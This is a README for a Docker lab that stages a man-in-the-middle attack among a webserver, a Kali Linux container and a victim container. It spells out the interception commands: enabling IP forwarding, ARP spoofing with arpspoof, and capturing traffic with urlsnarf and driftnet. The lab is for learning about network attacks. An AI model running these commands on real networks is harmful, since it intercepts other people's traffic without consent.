# Setup for an Man-in-the-middle (MITM) attack 
### Prerequisite
- Docker is installed
- you can use docker-compose commands

### Start
Just use following command:
`docker-compose up --build`

### Infrastructure 
There are 3 Machines: 
- Webserver 
- MITM with Kali Linux
- Victim Node (just an simple Alpine Linux)

### Steps (MITM):

1. Setup IP forwarding:
`echo 1 > /proc/sys/net/ipv4/ip_forward`
2. start arpspoof(Important: let it open): 
`arpspoof -i eth0 -t [Victim-IP] -r [Webserver-IP]`
3. Now you can use:
 - `urlsnarf -i eth0` -> get HTTP-Requests
 - `driftnet -i eth0` -> get Images
 
 ### Steps (Victim)
 Just type inside `wget webserver:8080` or outside `docker exec victim webserver:8080`